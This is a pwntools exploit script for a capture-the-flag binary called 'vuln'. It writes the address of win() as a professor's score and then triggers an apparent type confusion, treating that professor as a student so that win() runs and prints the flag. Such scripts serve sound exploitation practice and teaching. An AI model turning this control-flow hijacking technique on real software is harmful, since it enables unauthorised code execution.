#!/usr/bin/env python3

import argparse
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = './vuln'
libc = None
host = None
port = None

# ====================================================================
#   GLOBALS
# ====================================================================

T     = None      # The Target
LIBC  = None      # Libc ELF
BIN   = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)
            raw_input('PAUSED [PRESS ENTER TO CONTINUE]')

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================


def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BIN = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, args.port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    # (1) set the score of the professor to the address of win()
    T.sendlineafter('Input the name of a student\n', 'alice')
    T.sendlineafter('professor of a student \n', 'bob')

    T.sendlineafter('will give the score \n', 'alice')
    T.sendlineafter('professor that will be scored \n', 'bob')

    T.sendlineafter('Input the score: \n', str(BIN.sym['win']))

    # (2) next iteration, create a new professor and student and then
    # force the use of professor bob as a student so win() will get called
    # when setting the score
    T.sendlineafter('Input the name of a student\n', 'Bart Simpson')
    T.sendlineafter('professor of a student \n', 'Edna Krabappel')

    T.sendlineafter('will give the score \n', 'bob')
    T.sendlineafter('professor that will be scored \n', 'Edna Krabappel')

    T.sendlineafter('Input the score: \n', '1234')

    # (3) at this point student->scoreProfessor(professor, value); should have
    # been executed, and the flag printed.
    print 'Flag: ' + T.recvline().strip()
